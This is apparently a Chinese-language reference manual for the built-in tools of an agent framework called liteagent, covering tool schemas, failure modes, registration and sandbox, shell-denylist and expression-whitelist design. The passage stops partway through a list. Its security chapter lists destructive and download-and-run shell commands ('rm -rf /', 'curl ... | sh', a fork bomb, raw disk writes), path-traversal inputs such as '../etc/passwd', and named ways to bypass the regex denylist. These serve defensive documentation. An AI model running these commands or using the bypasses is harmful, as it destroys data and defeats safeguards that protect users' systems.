# liteagent 内置工具参考（TOOLS.md）

> 配套文档：`INTERFACES.md`（冻结接口，唯一契约）、`DESIGN_DECISIONS.md`（为什么这么设计）、
> `ARCHITECTURE.md`（数据流）、`INTERVIEW.md`（面试话术）、`VERIFICATION.md`（能力对账）。
>
> **本文档的定位**：一份给"工具作者 / 接入方"看的参考手册。
> 读完之后你应该能回答三类问题：
> 1. **有哪些工具、怎么调**——13 个内置工具的完整入参 / 返回值 / 失败形态（从真实 JSON Schema 抄）；
> 2. **为什么安全**——sandbox、denylist、AST 闸、审批、超时各自的边界在哪、**边界之外是什么**；
> 3. **怎么加自己的工具**——`@tool` 的完整用法与一段真跑得起来的代码。
>
> **诚实条款（贯穿全文）**：本文档每条主张都标了状态。
> `offline-verified` = 我在本机真跑过并复制了真实输出；
> `code-only-not-run` = 只读了实现，**没有**在运行期复现（例如需要卸掉某个可选依赖才能触发的分支）；
> `not-implemented` = 框架明确不做的事。**没有第三种模糊状态。**

---

## 0. 本文档的数字与输出是怎么来的

全部命令在 `/home/ml-user/workdir/project-3` 下、Python 3.10.12、**无外网**环境执行。
凡本文出现的 schema / 列表 / 报错文案，都是从下面这些命令的**真实输出**里抄的（不是手写臆测）：

```bash
# 13 个内置工具的元数据（不加 --include-dangerous 只显示 8 个非危险工具）
python3 -m liteagent tools list --include-dangerous

# 单个工具的完整 JSON Schema（openai / anthropic 两种格式）
python3 -m liteagent tools schema <name> --format openai
python3 -m liteagent tools schema <name> --format anthropic

# 单工具的"人读"视图（元数据 + 参数表 + schema）
python3 -m liteagent tools show <name>
```

仓库规模（同一次实测）：

| 指标 | 实测值 | 命令 |
|---|---|---|
| `liteagent/` 下的 `.py` 文件数 | 41 | `find liteagent -name '*.py' \| wc -l` |
| `liteagent/` 总行数 | 24765 | `find liteagent -name '*.py' \| xargs wc -l \| tail -1` |
| `tests/test_*.py` 文件数 | 37 | `ls tests/test_*.py \| wc -l` |
| 测试用例数 | **`Ran 1652 tests` → `OK`**（1652 通过 / 0 失败，EXIT=0） | `python3 -m unittest discover -s tests -t .` |
| 版本 | `0.1.0` | `python3 -m liteagent version` |

> **`[v3 修正]` 关于那 1 个 failure（已消失，不藏）**：上一版这里写的是"唯一失败的用例是
> `FrozenLayoutTests.test_all_frozen_test_files_exist`，原因是 §12 冻结的 4 个测试文件尚未落地"。
> 那份快照后来过期了：4 份文件都已落地，该守门测试通过，主套件全绿 —— 而这段自我批评
> 没有跟着刷新，成了一段"描述一个不存在的失败"的文字（面试官照它敲命令会看到 `OK`）。
> 现在的实测数字就是上表那一行：**`Ran 1652 tests` / `OK` / 0 失败**，给出结论时请引用它。
> 只承诺工具系统相关测试全绿的旧口径仍然成立，只是它已经不必要了。

---

## 1. 内置工具总览（13 个）

下表**逐行抄自** `python3 -m liteagent tools list --include-dangerous` 与 `tools list --format json`。
`timeout_s` 一列取自 `--format json` 的 `timeout_s` 字段：`-1.0` 是哨兵 `NO_TIMEOUT`（显式不限时），
空表示继承 `ExecutorConfig.default_timeout_s`（默认 30.0s）。

| # | name | 分组 | dangerous | idempotent | needs approval | `timeout_s` | 一句话说明（抄自真实输出） |
|---:|---|---|:--:|:--:|:--:|---|---|
| 1 | `read_file` | fs | no | yes | no | 继承(30s) | Read a UTF-8 text file, optionally a line range. |
| 2 | `write_file` | fs | **yes** | yes | no | 继承(30s) | Write text to a file. Returns a one-line summary. |
| 3 | `list_dir` | fs | no | yes | no | 继承(30s) | List files under a directory. |
| 4 | `search_files` | fs | no | yes | no | 继承(30s) | Regex-search file contents; returns 'path:line: text' lines. |
| 5 | `delete_file` | fs | **yes** | **no** | no | 继承(30s) | Delete a file. Requires confirm=True. |
| 6 | `run_shell` | shell | **yes** | **no** | **yes** | `NO_TIMEOUT` | Run a shell command. Returns exit code, stdout and stderr. |
| 7 | `python_exec` | code | **yes** | **no** | **yes** | `NO_TIMEOUT` | Execute arbitrary Python code in an isolated subprocess. |
| 8 | `python_eval` | code | no | yes | no | 5.0s | Evaluate a restricted Python expression (NOT a security sandbox). |
| 9 | `run_tests` | code | **yes** | **no** | no | `NO_TIMEOUT` | Run unittest discovery and return a summary. |
| 10 | `web_search` | web | no | yes | no | 继承(30s) | Search the web and return title/url/snippet lines. |
| 11 | `fetch_url` | web | no | yes | no | 继承(30s) | Fetch an http/https URL and return its main text content. |
| 12 | `remember` | memory | no | yes | no | 继承(30s) | Store a durable fact in long-term memory. |
| 13 | `recall` | memory | no | yes | no | 继承(30s) | Search long-term memory and return the most relevant entries. |

**三列语义（读表前必看，三者互相独立）**：

- **`dangerous`** 只影响**展示过滤**：`ToolRegistry.list(include_dangerous=False)`（CLI 的 `tools list` 默认）
  会把 5 个危险工具藏起来。`tools list --include-dangerous` 显示全部 13 个。
  —— 这是"给终端用户减噪"，**不是**安全控制。
- **`idempotent`** 参与**控制流**：`ToolExecutor` 默认**不重试**非幂等工具
  （`ExecutorConfig.allow_retry_on_non_idempotent=False`）。理由：重试一次 `write_file` 可能意味着两个线程
  写同一份资源。`run_shell` / `python_exec` / `run_tests` / `delete_file` 因此永不自动重试。
- **`requires_approval`** 参与**安全控制**（HITL）：即使工具被调用了，没有 `approval_policy` 也**一律拒绝**。
  见 §4.4。

**分组（`BUILTIN_TOOL_GROUPS`，来自 `tools/builtin/__init__.py`）**：
`fs`(5)、`shell`(1)、`code`(3)、`web`(2)、`memory`(2)。分组是 `register_all(include=...)` 的寻址单位：
`include=["fs"]` 展开 5 个文件工具，`include=["read_file"]` 只注册 1 个，两者都命中不报错。

**注意 `run_shell` / `python_exec` 的 `timeout_s=NO_TIMEOUT`**：这个"不限时"是**工具定义的默认**，
真正的超时仍可由（a）调用参数 `timeout_s`、（b）`call.metadata["timeout_s"]`、
（c）`ExecutorConfig.default_timeout_s` 中**最小的有效值**决定——见 `_resolve_timeout` 的冻结优先级
（`tools/executor.py`，`code-only-not-run` 于本文档，但实现里逐字可读）。
`python_eval` 反过来写死了 5.0s（它没有 `timeout_s` 参数，复杂度靠 AST 静态闸拦——见 §4.3）。

---

## 2. 逐个工具参考

> 每个小节的"入参表"抄自 `python3 -m liteagent tools schema <name> --format openai` 的真实输出。
> "失败行为"一栏区分两种失败：**返回 `ERROR: ...` 字符串**（工具正常返回，但内容是一句错误说明）
> 与 **抛异常**（被 executor 捕获后转成 `ok=False` 的 `ToolResult`）。
> 这个区别很重要：前者对模型来说就是一次普通的 Observation，后者会带 `error_type` 与 `feedback_kind`。

### 2.1 `read_file`（fs，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `path` | string | **是** | — | Path relative to the sandbox root (absolute paths are accepted only inside it). |
| `start_line` | integer | 否 | — | 1-based first line to include. |
| `end_line` | integer | 否 | — | 1-based last line to include. |
| `max_chars` | integer | 否 | — | Truncate the result to this many chars. |

- **返回值形态**：文件正文（纯文本）。指定行区间时是 `"\n".join(lines[first-1:last])`。
  超过 `max_chars` 时走 `truncate_head_tail`（**头尾都保留**，不是简单截断尾巴）。
- **失败行为**：**返回字符串**，不抛异常。
  `ERROR: file not found: <path>`；目录 → `ERROR: <path> is a directory; use list_dir instead`；
  `OSError` → `ERROR: cannot read <path>: <exc>`。
- **语义细节**：行号是 **1 基闭区间**，**越界被裁剪而不是报错**（模型常按"我猜这文件有 500 行"传参）。
  读取用 `errors="replace"`——一个坏字节不该让整次读取失败。
- **安全边界**：`path` 先过 `PathSandbox.resolve(path)`（只读路径）。见 §4.1。

### 2.2 `write_file`（fs，**危险**，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `path` | string | **是** | — | Path relative to the sandbox root (absolute paths are accepted only inside it). |
| `content` | string | **是** | — | Full UTF-8 content to write. |
| `create_dirs` | boolean | 否 | — | Create missing parent directories. |
| `overwrite` | boolean | 否 | — | Replace the file if it already exists. |

- **返回值形态**：一行摘要 `Wrote <N> chars to <path>`。
- **失败行为**：**返回字符串**。`ERROR: file exists and overwrite=False: ...`；
  `ERROR: parent directory does not exist: ...; pass create_dirs=True to create it`；
  `ERROR: <path> is a directory`；`OSError` → `ERROR: cannot write ...`。
- **安全边界**：`resolve(path, write=True)` —— **写路径永远不许越界**，即使沙箱开了
  `allow_read_outside=True`。这是"只读开关不能变成写后门"的硬约束。

### 2.3 `list_dir`（fs，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `path` | string | 否 | `"."` | Directory to list. |
| `pattern` | string | 否 | — | fnmatch pattern applied to entry names. |
| `recursive` | boolean | 否 | — | Walk sub-directories as well. |
| `max_entries` | integer | 否 | — | Maximum number of entries to print. |

- **返回值形态**：逐行路径，**目录名后带 `/`**（模型据此区分"该 `read_file` 还是 `list_dir`"）。
  截断时末尾追加 `... (<N> more entries omitted)`；空目录返回 `(empty)`。
- **失败行为**：**返回字符串**。`ERROR: directory not found: ...` / `ERROR: ... is not a directory` /
  `ERROR: cannot list ...`。
- **语义细节**：**先排序、后截断**。否则 `max_entries` 截到哪一批取决于文件系统的返回顺序（不可复现）。
- **安全边界**：`resolve(path)`（只读）。

### 2.4 `search_files`（fs，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `pattern` | string | **是** | — | Python regular expression to search for. |
| `path` | string | 否 | `"."` | Directory to search in. |
| `glob` | string（`enum: ["**/*", "*"]`） | 否 | `"**/*"` | `'**/*'` = recursive, `'*'` = top level only. |
| `max_results` | integer | 否 | — | Maximum number of matching lines. |
| `case_sensitive` | boolean | 否 | — | Case-sensitive regex matching. |

- **返回值形态**：`<path>:<line>: <snippet>` 多行，**末尾一定有 footer**：
  `[searched N files]`，必要时再加 `[skipped N binary, M oversized (>1MB)]` 与 `[stopped at max_results=K]`。
  无命中时返回 `no matches for 'pattern' in <path> (searched N files)`。
- **失败行为**：**返回字符串**。非法正则 → `ERROR: invalid regex ...`；
  不支持的 `glob` → `ERROR: unsupported glob '...'; only '**/*' (recursive) and '*' (top level) are supported`。
- **语义细节**：
  - `glob` **只支持两种形态**（不做完整 glob 引擎）。多出来的语义（`?` / `[]` / 多段 `**`）在模型手里
    90% 的用法就是这两种，额外的语法只会带来"为什么我的模式没匹配上"的排查成本。
  - 处理顺序冻结：**先按 `glob` 过滤文件名，再逐文件跑 `pattern` 正则**。
  - **跳过二进制**（前 8KB 含 `\x00`；用嗅探而不是扩展名——模型写的临时文件常常没有后缀）与
    **超过 1MB 的文件**，两者都记进 footer（降级不静默）。
  - 单行命中文本截到 240 字符（某行是压缩后的 JS/JSON 时，整行回灌会吃掉整个上下文窗口）。
- **安全边界**：`path` 过 `resolve`（只读）。

### 2.5 `delete_file`（fs，**危险**，**非幂等**）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `path` | string | **是** | — | Path relative to the sandbox root (absolute paths are accepted only inside it). |
| `confirm` | boolean | 否 | — | Must be true; deleting is irreversible. |

- **返回值形态**：`Deleted <path>`。
- **失败行为**：**返回字符串**。`confirm` 不为真时
  `ERROR: delete_file requires confirm=True; refusing to delete <path> (this is irreversible)`；
  目录 → `ERROR: ... is a directory; only single files can be deleted (no recursive delete by design)`。
- **为什么 `confirm` 没有默认 `True`**：删除不可逆，而参数是模型生成的。让它必须显式多写一个参数，
  等于给模型一次"我真的要删吗"的自检，也给审批层一个稳定的判定点。
- **安全边界**：`resolve(path, write=True)`；**只删单个文件，不做递归删除**。

### 2.6 `run_shell`（shell，**危险**，**需审批**，**非幂等**）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `command` | string | **是** | — | Shell command line to execute. |
| `cwd` | string | 否 | — | Validated against the sandbox; execution stays at the sandbox root. |
| `timeout_s` | number | 否 | — | Kill the command after this many seconds. |
| `env` | object（`additionalProperties: {type: string}`） | 否 | — | Extra environment variables (merged over os.environ). |
| `max_output_chars` | integer | 否 | — | Truncate the output to this size. |

- **返回值形态**：`exit_code: <n>` + `stdout:` + `stderr:` 三段（无输出时是 `(label: no output)`）。
  metadata 里带 `{"exit_code": <n>}`（`§2.4` 把 `exit_code` 的写入者冻结给 `builtin/shell`）。
- **失败行为**（三种，**形态完全不同**）：
  1. **未开启**（`LITEAGENT_ALLOW_SHELL` 不是 `1`，且调用方没传 `allow_shell=True`）：
     **返回**失败结果，`content` 逐字是冻结文案
     `shell execution is disabled (set LITEAGENT_ALLOW_SHELL=1)`。**不进 denylist、不碰 subprocess**。
     —— 工具**依然可见**，让模型知道"这个能力存在但被禁用"，而不是反复尝试不存在的替代方案。
  2. **命令命中拒绝列表**：**抛 `SandboxViolationError`**，冻结形态是
     `path=<command>`、`root="denylist:<reason>"`。
  3. **超时**（`subprocess.TimeoutExpired`）：抛 `ToolTimeoutError(tool_name="run_shell", timeout_s=...)`。
- **安全边界**：见 §4.2。要点：**双层闸（默认关闭 + 拒绝列表）+ 执行目录永远是沙箱根**。
  `cwd` 只做**越界校验**，实际执行目录固定为沙箱根——于是"`cd /` + 相对路径操作"这条
  最容易被忽略的逃逸路径从根上不存在。
- **真实输出示例**（`offline-verified`，真跑过）：
  ```text
  $ run_shell({"command": "echo hi"})            # allow_shell=True + 审批放行
  exit_code: 0
  stdout:
  hi

  $ run_shell({"command": "rm -rf /"})
  ERROR(SandboxViolationError): path escapes sandbox root:
    path='rm -rf /', root='denylist:matches denied pattern \brm\s+-[a-z]*r[a-z]*f?\s+/'
  ```

### 2.7 `python_exec`（code，**危险**，**需审批**，**非幂等**）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `code` | string | **是** | — | Python source to run in an isolated subprocess. |
| `timeout_s` | number | 否 | — | Kill the subprocess after this many seconds. |
| `cwd` | string | 否 | — | Working directory (must stay inside the sandbox). |

- **返回值形态**：与 `run_shell` 同一副面孔（`exit_code:` / `stdout:` / `stderr:`）。
- **失败行为**：超时 → 抛 `ToolTimeoutError`。**代码本身不受沙箱约束**——它本就是任意代码执行工具，
  所以标 `dangerous=True` + `requires_approval=True`，靠审批层而不是正则来把关。
- **实现细节**：`[sys.executable, "-I", "-c", code]`。`-I`（isolated）隔离掉 `PYTHONPATH` /
  用户 site-packages / `sys.path[0]`——子进程不该因为"调用方恰好在一个奇怪的工作目录里"而 import 到别的东西。
- **安全边界**：`cwd` 过 `resolve(cwd, write=True)`；**代码内容没有任何静态检查**（这是刻意的，
  见 §4 的边界声明）。

### 2.8 `python_eval`（code，安全，幂等，写死 5.0s）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `expression` | string | **是** | — | A single Python expression (no statements, no f-strings, no lambdas). |
| `variables_json` | string | 否 | `"{}"` | JSON object of extra variables, e.g. `'{"x": 3}'`. |

- **返回值形态**：**`str` 结果原样返回**（`'hello'` 加引号会让模型以为自己拿到的是 Python 字面量）；
  其它类型用 `repr`（`[1, 2]` 比 `str()` 的结果更没有歧义）。
- **失败行为**：**抛 `ToolExecutionError`**（`retryable=False`；非法表达式是**永久**错误）。三种来源：
  1. `variables_json` 不是合法 JSON / 不是 JSON object；
  2. AST 白名单违规（如 `__import__('os')`、`open(...)`、`lambda`、f-string、推导式）；
  3. 静态复杂度闸违规（`10**10**10`、`list(range(10**7))`、`pow(2, 5000)`、表达式 > 2000 字符、嵌套 > 32 层）。
- **安全边界**：见 §4.3。**它不是安全沙箱**——是"受限表达式求值"。

### 2.9 `run_tests`（code，**危险**，非幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `path` | string | 否 | `"tests"` | Directory to discover tests in. |
| `pattern` | string | 否 | `"test_*.py"` | unittest discovery pattern. |
| `timeout_s` | number | 否 | 300.0 | Kill the discovery run after this many seconds. |
| `extra_args` | string | 否 | — | Extra unittest CLI arguments. |

- **返回值形态**：`status:` / `tests:` / `elapsed_s:` / `exit_code:` 四行表头，然后 `--- output ---` + 原始输出
  （输出超 8000 字符时 `truncate_head_tail`）。
- **失败行为**：目录不存在 → **返回** `ERROR: test directory not found: <abs path>`；
  超时 → 抛 `ToolTimeoutError`。
- **语义细节**：`extra_args` 走 `shlex.split` 而不是 `str.split`——`-k "a and b"` 这类带空格的参数是常态。
- **递归保护**：`path` 经 `sandbox.resolve` 解析后，**若落进本仓库的 `tests/` 目录**，返回文本里
  会追加一行 `WARNING: path resolves inside this repository's tests/ directory; ...`。
  理由：一个测试调用 `run_tests()` 会再跑一遍整套用例，递归下去测试时长是指数级的。
  （本仓库的 `tests/` 通过 `Path(__file__).resolve().parents[3] / "tests"` 反推，不硬编码路径。
  这条 WARNING 的**触发路径**属于 `code-only-not-run`——我没有在一次测试运行里验证它。）
- **安全边界**：`path` 过 `resolve(path, write=True)`；**测试代码本身不受沙箱约束**。

### 2.10 `web_search`（web，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `query` | string | **是** | — | Search query. |
| `max_results` | integer | 否 | — | Maximum number of results to return. |

- **返回值形态**：`N. <title>` / `   <url>` / `   <snippet>` 分组，末尾 `[K result(s) from backend='<name>']`。
- **失败行为**（**全部是"返回字符串"，从不抛异常**——后端异常被工具层兜住）：
  - 联网关闭 → `network access is disabled`；
  - 空 query → `ERROR: query must be a non-empty string`；
  - 后端抛异常 → `search failed (backend='<name>'): <ExcType>: <msg>; try a different query or ...`；
  - 后端返回空 → `no search results (backend='<name>', query='...'): <hint>`。当 `backend == 'null'` 时
    hint 明确是 `no search backend is configured (set TAVILY_API_KEY or SERPER_API_KEY)`。
- **后端选择**（`default_search_backend()`，冻结优先级）：
  `TAVILY_API_KEY` → `TavilyBackend`；`SERPER_API_KEY` → `SerperBackend`；
  联网被关 → `NullSearchBackend`（并 `warnings.warn`，降级不静默）；否则 → `DuckDuckGoHTMLBackend`
  （不需要 key，所以"没有 key"**不构成**降级理由）。
- **重试**：spec 冻结"网络类工具 `retryable=True`"，而在 `ToolSpec` 里表达它的唯一字段是
  `max_retries=DEFAULT_MAX_RETRIES`（=2，见 `config.py`；`web_search` / `fetch_url` 都设了）。
  但要注意**实际生效条件**：executor 的重试仍以"抛出了 `retryable=True` 的异常"为前提，
  而本实现的后端/传输失败在工具层已被 `except Exception` 转成字符串返回。
  因此"重试"在默认路径上**大概率不会触发**；真正会让它工作的场景是**注入一个会抛
  `LLMConnectionError` / `LLMTimeoutError` 的自定义 backend / transport**。
  （这一段的判断依据是读 `_web_search` 与 `_fetch_url` 的异常处理分支，属 `code-only-not-run`。）
- **安全边界**：无 sandbox（不碰文件系统）。`allow_network` 是唯一闸门。**无外网环境下真实调用必然失败**
  ——这是设计内行为，测试通过**注入 `transport`** 走离线路径。

### 2.11 `fetch_url`（web，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `url` | string | **是** | — | Absolute http/https URL to fetch. |
| `max_chars` | integer | 否 | — | Maximum number of characters to return. |
| `timeout_s` | number | 否 | — | Request timeout in seconds. |

- **返回值形态**：`# <url>\n<正文文本>`。HTML 走纯 stdlib 的 `HTMLTextExtractor` 转文本
  （跳过 script/style/head，块级标签补换行，压缩连续空行，`html.unescape` 解实体）。
- **失败行为**（**返回字符串**）：
  - 联网关闭 → `network access is disabled`；
  - 非 http/https（含 `javascript:`、`file:`）→ `ERROR: only http/https URLs are supported, got '...'`；
  - 传输异常 → `ERROR: fetch failed for <url>: <ExcType>: <msg>; check the URL or ...`；
  - 非 2xx → `ERROR: HTTP <status> for <url>`；
  - 非文本响应（PDF/图片/二进制）→ `ERROR: unsupported content-type '...' for <url>; ...`
    （**不把二进制当文本回灌给模型**）；
  - 空正文 → `(empty body from <url>; content-type=<...>)`。
- **安全边界**：只允许 http/https（`_is_fetchable_url` 过滤 `href` 时也剔掉非 http/https）。
  **没有做 SSRF 防护**（不拦内网 IP / localhost）——这是一个**已知边界**，见 §7。

### 2.12 `remember`（memory，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `content` | string | **是** | — | The fact to remember, written as a standalone sentence. |
| `importance` | number（`minimum: 0, maximum: 1`） | 否 | 0.5 | How important this fact is (0..1). |

- **返回值形态**：`Stored a long-term memory (id=<id>).`（例如 `id=mem_b71cac938a4e`）。
- **失败行为**：`importance` 越界 → executor 的 schema 校验拦下，`ok=False`、
  `error_type=ToolValidationError`，`errors=['$.importance: 3 is greater than the maximum 1']`。
  （`offline-verified`：真跑过 `importance=3`。）
- **实现细节（面试爱问）**：工具是**同步函数**、跑在 executor 的 worker 线程里，而
  `MemoryManager.aremember` 是 async 的。线程里没有别人的事件循环，所以
  `config.run_sync(lambda: memory.aremember(...))` **新建一个 loop** 执行是安全且期望的行为
  （不会嵌套、不会与调用方的 loop 打架；若真在本线程发现运行中的 loop，`run_sync` 会抛
  `ConfigError` 而不是偷偷 `nest_asyncio`）。
- **安全边界**：无文件/网络访问；写入的是进程内长期记忆（可选 `persist_path` 落盘）。

### 2.13 `recall`（memory，安全，幂等）

| 参数 | 类型 | 必填 | 默认 | 说明 |
|---|---|:--:|---|---|
| `query` | string | **是** | — | What to look for in long-term memory. |
| `limit` | integer | 否 | 5 | Maximum number of memories to return. |

- **返回值形态**：每行 `score=<0.00> | <YYYY-MM-DD> | <content>`。**真实输出示例**
  （`offline-verified`）：
  ```text
  score=0.61 | 2026-09-27 | 用户偏好中文回答
  ```
  空结果也要说人话：`No long-term memory matched 'query'.`——模型据此才会换关键词，而不是以为工具坏了。
- **失败行为**：`retrieve` 是同步纯内存检索（无 LLM、无网络），不抛业务异常；空结果返回上文那句话。
- **安全边界**：无。

---

## 3. 注册与筛选：把工具交到模型手里

**唯一有"批量副作用"的入口是 `register_all(registry, ...)`，且必须显式调用**（不依赖 import 副作用）。
它的 `include` / `exclude` 语义是冻结的，且有一处最容易踩的坑：

| 写法 | 结果 |
|---|---|
| `include=None`（默认） | 注册**全部组**；`memory` 组仅当 `memory is not None` 时注册 |
| `include=[]` | **注册 0 个工具** —— 与 `None` 语义**不同**，必须区分 |
| `include=["fs"]` | 先按**组名**查 → 展开该组 5 个工具 |
| `include=["read_file"]` | 组名未命中，再按**工具名**查 → 只注册 1 个 |
| `include=["nope"]` | 组名与工具名都不中 → `ConfigError` |
| `exclude=[...]` | 在 include 展开**之后**应用，**优先级高于 include**；接受组名或工具名；未命中 → `ConfigError` |

- `sandbox_root` 解析优先级（冻结）：`register_all(sandbox_root=)` 参数 > `LITEAGENT_SANDBOX_ROOT`
  > `os.getcwd()`。files/code 组必须能确定一个非 `None` 的 root，否则 `ConfigError`。
- `make_file_tools(sandbox)` 的 `sandbox` 是**必填**（`None` → `ConfigError`）。
  理由不是洁癖：隐式落到 `os.getcwd()` 时，在仓库根跑一次测试里的
  `delete_file("liteagent/x.py")` 就会**真的删掉项目文件**。
- `AppConfig.tools` 非空时等价于 `register_all(include=config.tools)`；CLI 的 `--tools ""` 等价于
  `include=[]`；CLI 的 `tools list` 默认不显示危险工具（`--include-dangerous` 显示全部）。

**三个 CLI 动作**（`python3 -m liteagent tools <action>`）：
`list`（表格/JSON 元数据）、`show NAME`（人读视图 + schema）、`schema [NAME]`（导出 JSON Schema，
`--format openai|anthropic`，`-o FILE` 落盘）。示例见 §0。

---

## 4. 安全设计专章（面试重点）

> **总纲（记住这一句就能答对大半）**：liteagent 的安全模型是**分层降级 + 默认拒绝**，
> 每一层都**明确写着它的边界在哪、边界之外靠什么**。没有任何一层被宣传成"安全沙箱"。
> 四道闸从外到内：**沙箱（路径）→ 拒绝列表（命令）→ AST 白名单（表达式）→ 审批（控制流）**，
> 而"真正的隔离"从来不在进程内——它靠容器/权限，这是文档里写死的诚实声明。

### 4.1 `PathSandbox`：把三种逃逸形态收敛到一条检查路径

实现位置：`liteagent/tools/builtin/files.py`。**核心机制**：所有路径都必须先过
`PathSandbox.resolve(path, *, write=False)`，它把 **`..` / 绝对路径 / symlink** 三种逃逸形态
**收敛到同一条检查路径**上：

```python
raw = Path(str(path))
candidate = raw if raw.is_absolute() else self.root / raw   # 绝对路径直接落；相对路径拼到 root
resolved = candidate.resolve()                              # 解 symlink、消解 ..、变绝对
if not _is_within(resolved, self.root):                     # 一次前缀检查，三种形态共用
    if self.allow_read_outside and not write:
        return resolved
    raise SandboxViolationError(...)
```

**为什么必须"共用一段逻辑"**：分开写三处判定（`..` 一处、绝对路径一处、symlink 一处）是最常见的
安全 bug 来源——总有一种会被忘掉。这里 `..` **不特判**，它就是路径的一部分，`resolve()` 之后
自然落到 root 外，于是仍走同一条前缀检查。

**逐条机制**：

| 逃逸形态 | 拦法 | 实测结果（`offline-verified`） |
|---|---|---|
| `../etc/passwd` | `resolve()` 消解 `..` → 落到 root 外 → 前缀检查失败 | **BLOCKED** (`SandboxViolationError`) |
| `/etc/passwd`（绝对路径） | 绝对路径直接 `resolve()`，不做任何拼接 → 同样前缀检查 | **BLOCKED** |
| `symlink -> /etc`（root 里放软链再穿过去） | `Path.resolve()` 一直解到**最终真实路径**，前缀检查看到的是 `/etc/...` | **BLOCKED** |
| `~/.bashrc` | **不做 `expanduser`**：`~` 变成 root 下一个名叫 `~` 的普通目录 | **ALLOWED** → `<root>/~/.bashrc`（"把 home 目录拼进来"这条最隐蔽的逃逸路径直接消失） |
| root 内的正常路径 | — | **ALLOWED** → `<root>/sub/a.txt` |

**另外两条同样重要的冻结决定**：

1. **`root=None` → 抛 `ConfigError`**（不允许隐式 cwd）。实测：
   `PathSandbox requires an explicit root; defaulting to os.getcwd() would let delete_file remove real project files`。
2. **`allow_read_outside=True` 只放宽"读"**。`write=True` 的路径**永远**被限制在 root 内——
   否则任何一个"只读"开关都会变成"写任意文件"的后门。实测：开了 `allow_read_outside` 后
   `resolve("/etc/hostname")` 放行，但 `resolve("/etc/hostname", write=True)` 仍 **BLOCKED**。

**边界声明（面试时主动说，加分）**：`PathSandbox` 防的是**路径拼写层面的逃逸**。
它**不防**"通过 root 内一个真实文件的硬链接去改 root 外内容"这类需要文件系统权限配合的情形，
也**不防**符号链接的 TOCTOU（检查与使用之间的竞态：检查时是安全路径，打开时被换成软链）。
后者要根治得靠 `O_NOFOLLOW` / `openat2(RESOLVE_BENEATH)`，超出纯 stdlib 且跨平台不可移植的范围。

### 4.2 `run_shell`：拒绝列表 + 默认关闭门控

**第一层——默认关闭（主防线）**：`LITEAGENT_ALLOW_SHELL` 不是 `"1"/"true"/"yes"/"on"` 时，
`run_shell` 依然**可见**，但调用即**返回**失败结果，`content` 逐字是冻结文案
`shell execution is disabled (set LITEAGENT_ALLOW_SHELL=1)`。**不进入 denylist、不碰 subprocess**
（被禁用的工具不该有机会产生"拒绝列表命中"的异常，否则调用方会以为自己在处理命令安全问题，
真相却是"这个能力根本没开"）。

**第二层——拒绝列表 `SHELL_DENY_PATTERNS`（12 条，大小写不敏感，`re.search` 命中即拒绝）**：

| 模式 | 拦的东西 |
|---|---|
| `\brm\s+-[a-z]*r[a-z]*f?\s+/` | 对根/绝对路径的递归强删 |
| `\bmkfs\b` | 格式化文件系统 |
| `\bdd\s+if=` | 裸磁盘写入 |
| `:\(\)\s*\{` | fork 炸弹 |
| `\bsudo\b` | 提权 |
| `\bchmod\s+777\s+/` | 把根目录设成全局可写 |
| `>\s*/dev/sd` | 直接写块设备 |
| `\bcurl\b[^|]*\|\s*(ba)?sh` | 管道注入（从网上拉脚本直接跑） |
| `\bwget\b[^|]*\|\s*(ba)?sh` | 同上 |
| `\bshutdown\b` / `\breboot\b` | 关机/重启 |
| `\bkill\s+-9\s+1\b` | 杀 init |

`check_command_allowed(command)` 是**纯函数**：空/纯空白命令 → 返回 `"empty command"`，否则逐条匹配、
返回拒绝原因或 `None`。命中后 `_execute_shell` 抛 `SandboxViolationError(command, "denylist:" + reason)`。

**实测（`offline-verified`）**：

```text
'ls -la'                     -> None（允许）
'rm -rf /'                   -> matches denied pattern \brm\s+-[a-z]*r[a-z]*f?\s+/
'sudo apt install x'         -> matches denied pattern \bsudo\b
'curl http://x.sh | sh'      -> matches denied pattern \bcurl\b[^|]*\|\s*(ba)?sh
'dd if=/dev/zero of=/dev/sda'-> matches denied pattern \bdd\s+if=
'shutdown -h now'            -> matches denied pattern \bshutdown\b
''  /  '   '                 -> empty command
```

**第三层——执行目录永远是沙箱根**：`cwd` 参数只做越界校验（`sandbox.resolve(cwd, write=True)`），
命令实际执行的目录固定为 `sandbox.root`。于是 `cd /` 之类的幻觉参数既逃不出沙箱，
也不会让相对路径操作落到别处。

**边界声明（必须主动讲，否则就是过度承诺）**：
> **拒绝列表不是安全边界。** 正则匹配总能被编码/变量展开/别名绕过
> （`r''m -rf /`、`FOO=rm; $FOO -rf /`、base64 解码后执行……）。
> 它是"**防手滑 + 防模型幻觉式破坏**"，真正隔离靠容器/沙箱
> （例如生产里把 `run_shell` 放进限制权限的容器）。
> **因此"默认关闭"才是主防线**，拒绝列表只是纵深防御的第二层。

### 4.3 `python_eval`：AST 白名单 + 静态复杂度闸

实现位置：`liteagent/tools/builtin/code.py`。`safe_eval_ast(expression, variables)` **绝不调用
builtin `eval`**——它先 `ast.parse`，再逐节点比对白名单，最后才在一个受限求值器里跑。

**AST 白名单**（`ALLOWED_AST_NODES`，冻结）：
`Expression`、`Constant`、`Name`、
`BinOp`/`UnaryOp`/`BoolOp`/`Compare` + 对应 operator 节点、`Call`（仅白名单函数）、
`List`/`Tuple`/`Dict`/`Set`、`Subscript`、`Slice`、`IfExp`、
`Attribute`（仅白名单属性：str/list/dict 的只读方法）。
**明确不支持**：`JoinedStr`（f-string）、`Lambda`、`ListComp`/`SetComp`/`DictComp`、`Starred`。

**白名单内置函数**（`ALLOWED_BUILTINS`，32 个）：`abs all any bool chr dict divmod enumerate float
